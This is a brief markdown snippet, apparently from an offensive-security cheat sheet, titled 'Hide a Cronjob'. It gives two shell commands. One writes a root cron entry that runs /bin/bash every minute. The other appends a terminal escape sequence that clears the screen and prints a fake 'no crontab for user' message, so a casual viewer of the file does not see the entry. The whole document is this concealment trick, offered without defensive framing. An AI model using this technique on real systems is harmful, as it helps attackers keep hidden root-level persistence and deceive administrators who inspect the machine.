---
title: Hide a Cronjob
---

```
echo '* * * * * root /bin/bash' > test
printf '\033[2Jno crontab for user' >> test
```
